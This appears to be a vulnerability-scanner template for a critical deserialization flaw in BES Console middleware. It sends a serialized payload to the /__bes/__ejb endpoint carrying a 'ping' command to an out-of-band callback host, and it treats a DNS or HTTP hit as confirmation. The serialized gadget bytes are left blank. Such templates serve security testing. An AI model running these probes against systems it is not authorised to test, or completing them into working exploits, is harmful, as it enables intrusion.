id: bessystem-console-deserialization
info:
  name: 宝兰德 BES Console - 反序列化漏洞
  author: Chaitin
  severity: critical
  metadata:
    verified: true
    max-request: 1
    vuln-id: CT-1415459
    vendor: bessystem
    product: console
  tags: deserialization,vuln,bessystem
variables:
  reverseDNS: '{{interactsh-url}}'
  reversePadding: '                                                                 '
  newDNS: '{{concat(substr(reversePadding,0,60-len(reverseDNS)), reverseDNS)}}'
  command: '{{concat("ping ", newDNS)}}'
  prefix: 
    
  suffix: 
  finalData: '{{hex_decode(concat(prefix, hex_encode(command), suffix))}}'
http:
- method: POST
  path:
  - '{{BaseURL}}/__bes/__ejb'
  redirects: true
  headers:
    Content-Type: application/octet-stream
  body: |
    {{finalData}}
  matchers:
  - type: dsl
    dsl:
    - 'status_code == 200 && contains(interactsh_protocol, "dns") || contains(interactsh_protocol, "http")'
